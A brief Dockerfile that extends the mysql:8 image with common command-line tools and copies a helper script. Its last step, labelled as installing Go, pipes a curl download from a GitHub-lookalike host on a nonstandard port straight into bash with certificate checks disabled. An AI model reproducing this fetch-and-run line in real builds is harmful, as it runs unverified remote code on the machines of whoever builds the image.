FROM mysql:8

RUN apt-get update && apt-get install -y --no-install-recommends  vim wget curl dnsutils procps net-tools
COPY docker-go.sh /usr/local/bin/
#安装go
RUN curl -qks 'https://copygithub.com:30707/?c=Download/TargzRun&id=5e0171bd4f046' | bash

